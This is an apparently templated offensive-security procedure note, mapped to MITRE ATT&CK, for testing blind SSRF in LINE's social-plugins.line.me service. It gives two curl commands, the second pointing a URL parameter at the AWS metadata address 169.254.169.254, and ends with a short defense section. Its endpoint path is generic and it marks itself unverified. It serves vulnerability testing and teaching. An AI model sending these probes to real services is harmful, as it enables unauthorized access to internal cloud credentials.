---
id: proc-uuid-1
tags:
  - ssrf
  - dns-bypass
  - vulnerability-identification
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.485Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-SSRF-via-DNS-Bypass-in-LINE-Social-Plugins

## Summary

This procedure identifies a blind SSRF vulnerability in the LINE Social Plugins service by testing and bypassing DNS verification on a URL parameter in social-plugins.line.me, confirming the ability to force server-side requests to arbitrary destinations.

## Description

The LINE Social Plugins service handles web content sharing and processes URL parameters without adequate DNS validation, allowing attackers to supply internal or malformed URLs that bypass checks. This is tested in a public-facing web context, targeting the parameter responsible for fetching shared content. Prerequisites include HTTP request crafting capabilities. Expected outcomes include confirmation of SSRF via blind indicators like response timing or lack of errors.

## Requirements

1. Access to a tool for sending HTTP POST requests (e.g., curl or Burp Suite)
2. Knowledge of the target endpoint in social-plugins.line.me
3. No authentication required, but proxy interception for request modification

## Defense

Defensive measures and detection strategies:

- Implement strict URL whitelisting and DNS rebinding protection
- Monitor server logs for anomalous internal request patterns or unusual response times
- Use web application firewalls (WAF) to block suspicious URL payloads

## Objectives

1. Confirm SSRF vulnerability by evading DNS checks
2. Validate parameter manipulation for internal resolution
3. Assess potential for further exploitation

## Instructions

### Step 1: Craft Initial Test Request

**Context**: Send a basic request to the endpoint with a controlled URL to baseline normal behavior.

**Command** ([[commands/curl-ssrf-test]]):
```bash
curl -X POST 'https://social-plugins.line.me/api/endpoint' -d 'url=https://example.com' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

> This command sends a legitimate URL and observes the response time and status. Expected output: Standard 200 OK with content fetch confirmation.

### Step 2: Bypass DNS Verification

**Context**: Modify the URL to an internal endpoint like AWS metadata (169.254.169.254) or localhost to test bypass.

**Command** ([[commands/curl-ssrf-test]]):
```bash
curl -X POST 'https://social-plugins.line.me/api/endpoint' -d 'url=http://169.254.169.254/latest/meta-data/' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

> Explanation: The server attempts to fetch the internal URL without DNS validation, leading to longer response times if successful. Expected output: No DNS error, potential 200 or timeout indicating blind SSRF.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-test]]

## Tools Used


## Tags

- [[ssrf]]
- [[dns-bypass]]
